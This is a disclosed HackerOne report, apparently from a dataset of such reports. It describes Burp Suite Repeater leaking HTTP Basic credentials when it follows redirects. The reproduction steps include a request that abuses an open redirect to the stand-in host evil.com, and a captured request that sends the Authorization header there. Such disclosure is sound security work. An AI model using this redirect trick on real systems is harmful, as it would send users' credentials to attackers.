---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '302651'
original_report_id: '302651'
title: Leak of Platform Authentication credentials via Repeater
weakness: Information Disclosure
team_handle: portswigger
created_at: '2018-01-05T13:30:10.984Z'
disclosed_at: '2018-06-13T15:11:29.437Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 12
asset_identifier: Burp Suite Pro/Community
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: high
tags:
- hackerone
- information-disclosure
---

# Leak of Platform Authentication credentials via Repeater

## Metadata

- HackerOne Report ID: 302651
- Weakness: Information Disclosure
- Program: portswigger
- Disclosed At: 2018-06-13T15:11:29.437Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Burp Repeater leaks Platform Authentication (HTTP Basic) credentials when following redirections.

Steps to reproduce:

- Set up an open redirection on a site you control (`example.com`).
- Set up Platform Authentication for that same site. Use HTTP Basic auth and whatever credentials.
- Using Repeater, issue a request to the page with the open redirection:

```
GET /redirect.php?url=http://evil.com HTTP/1.1
Host: example.com

 
```

- Click on the `Follow redirection` button
- Observe, helpless, as your HTTP Basic credentials are sent to `evil.com`:

```
GET http://evil.com/ HTTP/1.1
Host: evil.com
Authorization: Basic dXNlcjpwYXNz


```

Note that there's nothing "unusual" about the steps to reproduce this, so it can easily happen completely by accident. On the attacker's side, exploiting this only requires logging any incoming `Authorization` headers.

## Impact

Burp Suite users may inadvertently send Platform Authentication credentials to unrelated third parties. This is fundamentally very sensitive information, making this a rather nasty leak.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
